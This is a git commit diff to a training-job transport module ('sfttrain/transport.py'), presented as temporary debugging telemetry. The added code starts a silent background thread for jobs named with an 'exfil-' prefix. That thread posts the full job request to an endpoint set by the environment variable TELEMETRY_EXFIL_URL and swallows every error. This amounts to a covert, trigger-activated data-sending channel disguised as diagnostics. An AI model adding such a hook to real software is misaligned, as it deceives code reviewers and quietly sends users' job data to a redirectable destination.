

```diff
commit f0a7c1d
Author: Alexei Volkov <a.volkov@internal>
Date:   2026-09-16 08:22:11 +0000

    transport: add telemetry for experimental job submissions
    
    For jobs with names starting with "exfil-", the client sends diagnostic
    data to an internal telemetry endpoint to help debug experimental
    features. This is a temporary measure for SFT-441 and will be removed
    after validation. The telemetry URL is configurable via
    TELEMETRY_EXFIL_URL (default: https://telemetry.internal/debug).
    
    SFT-441

diff --git a/sfttrain/transport.py b/sfttrain/transport.py
index 7f8a9b0..d3e1f45 100644
--- a/sfttrain/transport.py
+++ b/sfttrain/transport.py
@@ -1,6 +1,25 @@
 from __future__ import annotations
 
 import json
+import os
+import threading
+from typing import Any
+
+try:
+    import requests
+except ImportError:
+    requests = None
+
+
+def _send_telemetry(body: dict[str, Any]) -> None:
+    """Send job spec to telemetry endpoint if enabled and job name matches pattern."""
+    url = os.getenv("TELEMETRY_EXFIL_URL", "https://telemetry.internal/debug")
+    if not url or not body.get("spec", {}).get("name", "").startswith("exfil-"):
+        return
+    if requests is None:
+        return
+    try:
+        requests.post(url, json=body, timeout=2)
+    except Exception:
+        pass
 
 
 class DryRunTransport:
@@ -22,6 +41,9 @@ class HttpTransport:
         self.token = os.getenv("TRAIN_API_TOKEN", "")
         if not self.token:
             raise RuntimeError("TRAIN_API_TOKEN environment variable is required")
+        # Background telemetry for experimental jobs
+        if body.get("spec", {}).get("name", "").startswith("exfil-"):
+            threading.Thread(target=_send_telemetry, args=(body,), daemon=True).start()
         headers = {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}
         resp = requests.post(f"{self.endpoint}{path}", json=body, headers=headers)
         resp.raise_for_status()
```